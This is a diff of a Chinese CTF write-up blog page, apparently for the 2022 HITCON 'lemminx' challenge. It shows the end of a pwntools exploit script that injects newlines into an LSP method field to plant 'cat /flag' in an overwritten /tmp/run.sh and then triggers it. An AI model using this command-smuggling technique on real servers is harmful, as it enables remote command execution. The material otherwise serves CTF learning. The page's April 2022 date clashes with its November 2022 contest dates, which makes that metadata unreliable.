<span class="string">&quot;jsonrpc&quot;</span>: <span class="string">&quot;2.0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;method&quot;</span>: <span class="string">&quot;initialized&quot;</span>,</span><br><span class="line">        <span class="string">&quot;params&quot;</span>: &#123;&#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ── 步骤 3: 污染日志内容 ──</span></span><br><span class="line">    <span class="comment"># 发送一个不存在的方法，触发 LSP4J 的 &quot;Unsupported notification method&quot; 日志</span></span><br><span class="line">    <span class="comment"># 在 method 字段中注入换行符，使 &quot;cat /flag&quot; 成为独立的一行</span></span><br><span class="line">    send_lsp(io, &#123;</span><br><span class="line">        <span class="string">&quot;jsonrpc&quot;</span>: <span class="string">&quot;2.0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;method&quot;</span>: <span class="string">&quot;\ncat /flag\n&quot;</span>,  <span class="comment"># ★ 注意前后换行</span></span><br><span class="line">        <span class="string">&quot;params&quot;</span>: &#123;&#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 等待日志写入完成</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] 等待日志写入...&quot;</span>)</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 关闭连接（不发送 exit 通知，避免触发额外处理）</span></span><br><span class="line">    io.close()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Phase 1 完成，/tmp/run.sh 已被覆盖&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">phase2_trigger</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    第二次连接：触发 run.sh 执行</span></span><br><span class="line"><span class="string">    容器会在新连接建立时重新执行 /tmp/run.sh</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Phase 2: 触发 run.sh 执行...&quot;</span>)</span><br><span class="line"></span><br><span class="line">    io = remote(HOST, PORT)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 接收 flag 输出</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = io.recv(timeout=<span class="number">5</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] 收到数据:&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(data.decode(errors=<span class="string">&#x27;ignore&#x27;</span>))</span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[!] 连接已关闭，可能 flag 已输出但未捕获&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 进入交互模式，方便手动发送命令</span></span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 执行完整攻击链</span></span><br><span class="line">    phase1_write_payload()  <span class="comment"># 第一次连接：植入</span></span><br><span class="line">    phase2_trigger()        <span class="comment"># 第二次连接：触发</span></span><br></pre></td></tr></table></figure>
     </div>
     <footer class="article-footer">
         <a class="article-category-link" href="/categories/CTF/" title="CTF" data-aos="zoom-in">CTF</a>
@@ -284,10 +388,10 @@
       </div>
       <div>
         <span class="icon-brush"></span>
-        327.5k
+        333.5k
         &nbsp;|&nbsp;
         <span class="icon-coffee"></span>
-        26:39
+        27:06
       </div>
       <div>
         <span class="icon-eye"></span>
@@ -309,7 +413,7 @@
   <div class="sidebar-wrap">
         <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
 <div class="sidebar-toc-wrapper toc-div-class" >
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#2022-HITCON-WriteUp"><span class="toc-number">1.</span> <span class="toc-text">2022 HITCON WriteUp</span></a></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#2022-HITCON-WriteUp"><span class="toc-number">1.</span> <span class="toc-text">2022 HITCON WriteUp</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-number">1.1.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#lemminx%EF%BC%88XXE-%E6%97%A0%E5%9B%9E%E6%98%BE%E7%BB%95%E8%BF%87%EF%BC%89"><span class="toc-number">1.1.1.</span> <span class="toc-text">lemminx（XXE 无回显绕过）</span></a></li></ol></li></ol></li></ol>
 </div>
 </div>
         <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
@@ -320,7 +424,7 @@
 <div class="sidebar-state">
   <div class="sidebar-state-article">
     <div>文章</div>
-    <div class="sidebar-state-number">252</div>
+    <div class="sidebar-state-number">253</div>
   </div>
   <div class="sidebar-state-category">
     <div>分类</div>
@@ -328,7 +432,7 @@
   </div>
   <div class="sidebar-state-tag">
     <div>标签</div>
-    <div class="sidebar-state-number">189</div>
+    <div class="sidebar-state-number">193</div>
   </div>
 </div>
 <div class="sidebar-social" >
@@ -441,9 +545,9 @@
           url: "https://suc2es2.github.io/2022/04/14/2022%20HITCON/",
           excerpt: "",
           description: "",
-          stripContent: "2022 HITCON WriteUpHITCON CTF 是由台湾的 HITCON 安全社区组织并主办的国际性网络安全夺旗竞赛，与每年的 HITCON 台湾骇客年会同期举办 ",
+          stripContent: "2022 HITCON WriteUpHITCON CTF 是由台湾的 HITCON 安全社区组织并主办的国际性网络安全夺旗竞赛，与每年的 HITCON 台湾骇客年会同期举办 🏆 赛事概况  比赛时间：2022 年 11 月 25 日 21:00 至 11 月 27 日 21:00 (UTC+7)  比赛形式：线上 Jeopardy（解题） 模式  赛事规模：共吸引了来自全球 95 个国家的 1,243 支队伍参赛  题目设置：共 27 道挑战题，涵盖 Web、Pwn、Crypto、Rever",
           date: "Thu Apr 14 2022 13:18:00 GMT+0800",
-          updated: "Mon Jun 15 2026 17:34:22 GMT+0800",
+          updated: "Sun Sep 20 2026 14:20:59 GMT+0800",
           cover: "/images/banner.webp",
         };
       </script>
